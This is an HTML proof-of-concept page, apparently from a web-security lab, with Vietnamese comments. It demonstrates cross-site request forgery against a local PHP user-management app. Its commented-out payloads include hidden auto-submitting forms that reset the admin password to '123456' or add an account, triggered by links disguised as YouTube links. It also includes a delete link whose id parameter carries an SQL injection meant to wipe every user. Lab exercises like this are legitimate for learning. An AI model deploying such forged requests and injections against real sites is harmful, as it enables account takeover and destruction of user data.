<!doctype html>
<html>

<head>
    <meta charset="utf-8">
    <title>CSRF POST auto-submit (lab)</title>
</head>

<body>

    <!-- Thay đổi tài khoản admin -->
    <!-- <a href="https://www.youtube.com/" onclick="document.querySelector('#csrfForm button').click(); return false;">
        Đổi mật khẩu admin
    </a>

    <form id="csrfForm" method="POST" action="form_user.php?id=1" style="display:none;">
        <input type="hidden" name="id" value="1">
        <input type="hidden" name="name" value="admin">
        <input type="hidden" name="password" value="123456">
        <button type="submit" name="submit" value="submit" class="btn btn-primary">
        </button>
    </form> -->

    <!-- Thêm tài khoản mới -->
    <!-- <a href="https://www.youtube.com/" onclick="document.querySelector('#csrfForm button').click(); return false;">
        Thêm tài khoản mới
    </a>

    <form id="csrfForm" method="POST" action="form_user.php" style="display:none;">
        <input type="hidden" name="id" value="1">
        <input type="hidden" name="name" value="Minh Hieu">
        <input type="hidden" name="password" value="123456">
        <button type="submit" name="submit" value="submit" class="btn btn-primary">
        </button>
    </form> -->

    <br>
    <!-- Xóa hết người dùng -->
    <!-- <a href="http://localhost/csrf/delete_user.php?id=100 OR 1 = 1" onclick="document.querySelector('#csrfForm button').click(); return false;">
        Xóa hết dữ liệu
    </a> -->
</body>

</html>
